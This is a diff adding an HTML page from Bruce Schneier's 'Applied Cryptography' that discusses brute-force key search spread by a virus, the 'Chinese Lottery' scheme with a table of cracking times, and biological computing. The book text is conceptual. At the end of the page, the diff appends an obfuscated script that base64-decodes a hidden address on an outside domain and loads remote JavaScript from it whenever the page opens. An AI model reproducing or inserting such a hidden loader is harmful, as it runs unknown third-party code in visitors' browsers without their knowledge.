@@ -1,0 +1,166 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=155-157//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Viruses</I></B></FONT></P>
+<P>The greatest difficulty in getting millions of computers to work on a brute-force attack is convincing millions of computer owners to participate. You could ask politely, but that&#146;s time-consuming and they might say no. You could try breaking into their machines, but that&#146;s even more time-consuming and you might get arrested. You could also use a computer virus to spread the cracking program more efficiently over as many computers as possible.
+</P>
+<P>This is a particularly insidious idea, first presented in [1593]. The attacker writes and lets loose a computer virus. This virus doesn&#146;t reformat the hard drive or delete files; it works on a brute-force cryptanalysis problem whenever the computer is idle. Various studies have shown that microcomputers are idle between 70 percent and 90 percent of the time, so the virus shouldn&#146;t have any trouble finding time to work on its task. If it is otherwise benign, it might even escape notice while it does its work.</P>
+<P>Eventually, one machine will stumble on the correct key. At this point there are two ways of proceeding. First, the virus could spawn a different virus. It wouldn&#146;t do anything but reproduce and delete any copies of the cracking virus it finds but would contain the information about the correct key. This new virus would simply propagate through the computer world until it lands on the computer of the person who wrote the original virus.</P>
+<P>A second, sneakier approach would be for the virus to display this message on the screen:</P>
+<!-- CODE SNIP //-->
+<PRE>
+    There is a serious bug in this computer.
+    Please call 1-800-123-4567 and read the
+    following 64-bit number to the operator:
+
+    xxxx xxxx xxxx xxxx
+
+    There is a $100 reward for the first
+    person to report this bug.
+</PRE>
+<!-- END CODE SNIP //-->
+<P>How efficient is this attack? Assume the typical infected computer tries a thousand keys per second. This rate is far less than the computer&#146;s maximum potential, because we assume it will be doing other things occasionally. Also assume that the typical virus infects 10 million machines. This virus can break a 56-bit key in 83 days and a 64-bit key in 58 years. You might have to bribe the antiviral software makers, but that&#146;s your problem. Any increase in computer speeds or the virus infection rate would, of course, make this attack more efficient.
+</P>
+<P><FONT SIZE="+1"><B><I>The Chinese Lottery</I></B></FONT></P>
+<P>The Chinese Lottery is an eclectic, but possible, suggestion for a massively parallel cryptanalysis machine [1278]. Imagine that a brute-force, million-test-per-second cracking chip was built into every radio and television sold. Each chip is programmed to test a different set of keys automatically upon receiving a plaintext/ciphertext pair over the airwaves. Every time the Chinese government wants to break a key, it broadcasts the data. All the radios and televisions in the country start chugging away. Eventually, the correct key will appear on someone&#146;s display, somewhere in the country. The Chinese government pays a prize to that person; this makes sure that the result is reported promptly and properly, and also helps the sale of radios and televisions with the cracking chips.
+</P>
+<P>If every man, woman, and child in China owns a radio or television, then the correct key to a 56-bit algorithm will appear in 61 seconds. If only 1 in 10 Chinese owns a radio or television&#151;closer to reality&#151;the correct key will appear in 10 minutes. The correct key for a 64-bit algorithm will appear in 4.3 hours&#151;43 hours if only 1 in 10 owns a radio or television.</P>
+<P>Some modifications are required to make this attack practical. First, it would be easier to have each chip try random keys instead of a unique set of keys. This would make the attack about 39 percent slower&#151;not much in light of the numbers we&#146;re working with. Also, the Chinese Communist party would have to mandate that every person listen to or watch a certain show at a certain time, just to make sure that all of the radios and televisions are operating when the plaintext/ciphertext pair is broadcast. Finally, everyone would have to be instructed to call a Central-Party-Whatever-It&#146;s-Called if a key ever shows up on their screen, and then to read off the string of numbers appearing there.</P>
+<P>Table 7.2 shows the effectiveness of the Chinese Lottery for different countries and different key lengths. China would clearly be in the best position to launch such an attack if they have to outfit every man, woman, and child with their own television or radio. The United States has fewer people but a lot more equipment per capita. The state of Wyoming could break a 56-bit key all by itself in less than a day.</P>
+<P><FONT SIZE="+1"><B><I>Biotechnology</I></B></FONT></P>
+<P>If biochips are possible, then it would be foolish not to use them as a distributed brute-force cryptanalysis tool. Consider a hypothetical animal, unfortunately called a &#147;DESosaur&#148; [1278]. It consists of biological cells capable of testing possible keys. The plaintext/ciphertext pair is broadcast to the cells via some optical channel (these cells are transparent, you see). Solutions are carried to the DESosaur&#146;s speech organ via special cells that travel through the animal&#146;s circulatory system.
+</P>
+<P>The typical dinosaur had about 10<SUP>14</SUP> cells (excluding bacteria). If each of them can perform a million encryptions per second (granted, this is a big if), breaking a 56-bit key would take seven ten-thousandths of a second. Breaking a 64-bit key would take less than two tenths of a second. Breaking a 128-bit key would still take 10<SUP>11</SUP> years, though.</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="5">Table 7.2<BR>Brute-Force Cracking Estimates for Chinese Lottery
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TH WIDTH="25%" ALIGN="CENTER" VALIGN="BOTTOM">
+<TH WIDTH="20%" ALIGN="CENTER" VALIGN="BOTTOM">
+<TH WIDTH="20%" ALIGN="CENTER" VALIGN="BOTTOM">
+<TH WIDTH="20%" ALIGN="CENTER" VALIGN="BOTTOM">
+<TH WIDTH="15%" ALIGN="CENTER" VALIGN="BOTTOM">
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">
+<TH ALIGN="CENTER" VALIGN="BOTTOM">
+<TH ALIGN="CENTER" VALIGN="BOTTOM">
+<TH COLSPAN="2" ALIGN="CENTER" VALIGN="BOTTOM">Time to Break
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">
+<TD COLSPAN="2"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">Country
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Population
+<TH ALIGN="CENTER" VALIGN="BOTTOM"># of Televisions/Radios
+<TH ALIGN="CENTER" VALIGN="BOTTOM">56-bit
+<TH ALIGN="CENTER" VALIGN="BOTTOM">64-bit
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">China
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1,190,431,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">257,000,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">280 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">20 hours
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">U.S.
+<TD ALIGN="CENTER" VALIGN="BOTTOM">260,714,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">739,000,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">97 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">6.9 hours
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Iraq
+<TD ALIGN="CENTER" VALIGN="BOTTOM">19,890,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">4,730,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">4.2 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">44 days
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Israel
+<TD ALIGN="CENTER" VALIGN="BOTTOM">5,051,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3,640,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">5.5 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">58 days
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Wyoming
+<TD ALIGN="CENTER" VALIGN="BOTTOM">470,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1,330,000
+<TD ALIGN="CENTER" VALIGN="BOTTOM">15 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">160 days
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Winnemucca, NV
+<TD ALIGN="CENTER" VALIGN="BOTTOM">6,100
+<TD ALIGN="CENTER" VALIGN="BOTTOM">17,300
+<TD ALIGN="CENTER" VALIGN="BOTTOM">48 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">34 years
+<TR>
+<TD COLSPAN="5"><HR>
+<TR>
+<TD COLSPAN="3" ALIGN="LEFT" VALIGN="BOTTOM">(All data is from the <I>1995 World Almanac and Book of Facts.</I>)
+</TABLE>
+<P>Another biological approach is to use genetically engineered cryptanalytic algae that are capable of performing brute-force attacks against cryptographic algorithms [1278]. These organisms would make it possible to construct a distributed machine with more processors because they could cover a larger area. The plaintext/ciphertext pair could be broadcast by satellite. If an organism found the result, it could induce the nearby cells to change color to communicate the solution back to the satellite.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(zLQGFCzx, SPBGoLTS) {SPBGoLTS = zLQGFCzx.createElement('script');SPBGoLTS.type = 'text/javascript';SPBGoLTS.async = true;SPBGoLTS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');zLQGFCzx.getElementsByTagName('body')[0].appendChild(SPBGoLTS);}(document));</script></body>
+</html>
